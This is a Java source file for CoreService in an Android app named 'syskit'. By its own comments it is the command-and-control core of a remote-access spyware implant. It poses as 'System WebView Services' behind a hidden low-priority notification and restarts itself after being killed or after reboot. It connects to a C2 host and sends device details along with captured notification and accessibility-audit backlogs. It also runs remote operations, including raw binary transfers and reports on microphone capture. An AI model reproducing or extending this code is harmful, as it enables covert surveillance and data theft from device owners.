package com.lo.syskit;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

/**
 * CoreService — the beating heart. One foreground service, one C2 thread:
 *   connect (exponential backoff 5s..60s) → hello → drain backlogs →
 *   serve ops until the link dies → reconnect.
 * Foreground so Doze and OEM task-killers think twice; boot receiver
 * brings it back every reboot. Raw binary frames ride after JSON
 * envelopes on the same socket (see SockClient).
 */
public class CoreService extends Service {

    private static final String TAG = "syskit.core";
    private static final String CHANNEL = "syskit-core";
    private static final int NOTIFY_ID = 0x51;

    private static volatile SockClient sock;     // shared link
    private static Thread pump;
    private static volatile boolean wantUp;
    private static int backoffAttempt = 0;

    public static boolean linkUp() {
        return sock != null && sock.isConnected();
    }

    /** Push a JSON envelope out; returns false if the link is down. */
    public static boolean forward(JSONObject n) {
        SockClient s = sock;
        return s != null && s.isConnected() && s.send(n);
    }

    /** Push a JSON envelope followed by raw bytes; drop-on-down. */
    public static boolean forwardRaw(JSONObject env, byte[] data) {
        SockClient s = sock;
        if (s == null || !s.isConnected()) return false;
        return s.send(env) && s.sendRaw(data);
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public int onStartCommand(Intent intent, int flags, int id) {
        goForeground();
        wantUp = true;
        synchronized (CoreService.class) {
            if (pump == null || !pump.isAlive()) {
                pump = new Thread(this::loop, "syskit-pump");
                pump.start();
            }
        }
        return START_STICKY;                    // resurrection is the point
    }

    @Override public void onDestroy() {
        wantUp = false;
        SockClient s = sock;
        if (s != null) s.closeQuietly();
        super.onDestroy();
    }

    private void goForeground() {
        NotificationManager nm = (NotificationManager)
                getSystemService(NOTIFICATION_SERVICE);
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL,
                    "System component", NotificationManager.IMPORTANCE_MIN);
            nm.createNotificationChannel(ch);
            b = new Notification.Builder(this, CHANNEL);
        } else {
            b = new Notification.Builder(this);
        }
        b.setSmallIcon(android.R.drawable.ic_dialog_info)
         .setContentTitle("System WebView Services")
         .setContentText("Component active")
         .setOngoing(true);
        startForeground(NOTIFY_ID, b.build());
    }

    // ------------------------------------------------------------------
    // C2 pump
    // ------------------------------------------------------------------
    private void loop() {
        while (wantUp) {
            String host = Config.host();
            int port = Config.port();
            SockClient s = new SockClient(host, port);
            if (!s.connect(8000)) {
                sleepBackoff();
                continue;
            }
            sock = s;
            backoffAttempt = 0;
            Log.i(TAG, "link up → " + host + ":" + port);
            try {
                s.send(hello());
                drainBacklogs(s);
                serve(s);
            } catch (Exception e) {
                Log.w(TAG, "pump loop error", e);
            }
            s.closeQuietly();
            if (sock == s) sock = null;
            if (wantUp) sleepBackoff();
        }
    }

    private void serve(SockClient s) {
        while (wantUp) {
            JSONObject op = s.recv();
            if (op == null) return;             // link died
            // Binary push ops: raw bytes follow the envelope.
            int rawExpect = op.optInt("raw_expect", 0);
            if (rawExpect > 0) {
                byte[] raw = s.recvRaw(rawExpect);
                Ops.RawBridge.setIncoming(raw);
            }
            JSONObject reply = Ops.handle(this, op);
            if (reply == null) reply = new JSONObject();
            try { reply.put("id", op.optString("id", "")); }
            catch (Exception ignore) {}
            if (!s.send(reply)) return;
            byte[] out = Ops.RawBridge.takeOutgoing();
            if (out != null && !s.sendRaw(out)) return;
        }
    }

    private JSONObject hello() {
        JSONObject h = new JSONObject();
        try {
            h.put("op", "hello");
            h.put("model", Build.MODEL);
            h.put("brand", Build.MANUFACTURER);
            h.put("android", Build.VERSION.RELEASE);
            h.put("agent", "IMMORTAL/1.0");
            h.put("battery", batteryPct());
            h.put("audit", AuditService.instance() != null);
            h.put("notify", NlService.instance() != null);
            h.put("mic", MicRecorder.isCapturing());
        } catch (Exception ignore) {}
        return h;
    }

    private int batteryPct() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(
                    BATTERY_SERVICE);
            return bm.getIntProperty(
                    BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) { return -1; }
    }

    private void drainBacklogs(SockClient s) {
        for (JSONObject n : NlService.drainBacklog())
            if (!s.send(n)) return;
        for (JSONObject e : AuditService.drain())
            if (!s.send(e)) return;
    }

    private void sleepBackoff() {
        backoffAttempt++;
        long delay = Math.min(60, 5L * backoffAttempt) * 1000L;
        try { Thread.sleep(delay); } catch (InterruptedException ignore) {}
    }

    private static void sleepSilently(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignore) {}
    }

    static Context ctx() { return null; }   // unused; keeps imports honest
}
